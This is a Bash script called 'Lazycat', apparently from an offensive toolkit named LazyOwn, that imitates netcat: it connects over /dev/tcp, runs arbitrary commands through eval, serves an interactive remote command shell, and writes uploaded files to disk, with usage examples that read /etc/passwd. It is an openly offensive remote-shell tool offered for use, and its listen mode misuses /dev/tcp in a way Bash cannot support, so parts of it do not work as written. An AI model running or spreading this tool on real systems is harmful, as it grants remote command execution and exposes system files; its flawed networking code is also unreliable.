#!/bin/bash

# Definir variables globales
listen=false
command=false
upload=false
execute=""
target=""
upload_destination=""
port=0

function usage {
    echo "Lazycat"
    echo
    echo "Usage: lazync.sh -t target_host -p port"
    echo "-l --listen                - listen on [host]:[port] for incoming connections"
    echo "-e --execute=file_to_run   - execute the given file upon receiving a connection"
    echo "-c --command               - initialize a command shell"
    echo "-u --upload=destination    - upon receiving connection upload a file and write to [destination]"
    echo
    echo "Examples: "
    echo "lazync.sh -t 10.10.10.10 -p 5555 -l -c"
    echo "lazync.sh -t 10.10.10.10 -p 5555 -l -u=/tmp/target.bin"
    echo "lazync.sh -t 10.10.10.10 -p 5555 -l -e=\"cat /etc/passwd\""
    echo "echo 'ABCDEFGHI' | ./lazync.sh -t 10.10.10.10 -p 135"
    exit 0
}

function run_command {
    local cmd="$1"
    # Ejecutar el comando y capturar la salida
    output=$(eval "$cmd" 2>&1)
    echo -e "$output"
}

function client_handler {
    local client_socket="$1"

    # Comprobar si se debe subir un archivo
    if [ -n "$upload_destination" ]; then
        file_buffer=""
        while read -r data; do
            file_buffer+="$data"
        done < "$client_socket"
        echo -n "$file_buffer" > "$upload_destination"
        echo "Successfully saved file to $upload_destination" > "$client_socket"
    fi

    # Comprobar si se debe ejecutar un comando
    if [ -n "$execute" ]; then
        output=$(run_command "$execute")
        echo -e "$output" > "$client_socket"
    fi

    # Entrar en bucle si se solicitó un shell de comandos
    if $command; then
        while true; do
            echo -n "[LazyOwn#] " > "$client_socket"
            read -r cmd < "$client_socket"
            response=$(run_command "$cmd")
            echo -e "$response" > "$client_socket"
        done
    fi
}

function server_loop {
    if [ -z "$target" ]; then
        target="0.0.0.0"
    fi

    while true; do
        # Crear un servidor TCP usando netcat (o similar)
        exec 3<>/dev/tcp/$target/$port
        client_handler /dev/tcp/$target/$port &
    done
}

function client_sender {
    local buffer="$1"
    exec 3<>/dev/tcp/$target/$port
    if [ -n "$buffer" ]; then
        echo -e "$buffer" > /dev/tcp/$target/$port
    fi
    while true; do
        read -r response <&3
        echo -n "$response"
        read -r buffer
        echo -e "$buffer" > /dev/tcp/$target/$port
    done
}

# Analizar las opciones de la línea de comandos
while getopts "hle:t:p:cu:" opt; do
    case "$opt" in
        h) usage ;;
        l) listen=true ;;
        e) execute="$OPTARG" ;;
        c) command=true ;;
        u) upload=true; upload_destination="$OPTARG" ;;
        t) target="$OPTARG" ;;
        p) port="$OPTARG" ;;
        *) usage ;;
    esac
done

# Ejecución del script
if ! $listen && [ -n "$target" ] && [ "$port" -gt 0 ]; then
    buffer=$(cat)
    client_sender "$buffer"
fi

if $listen; then
    server_loop
fi
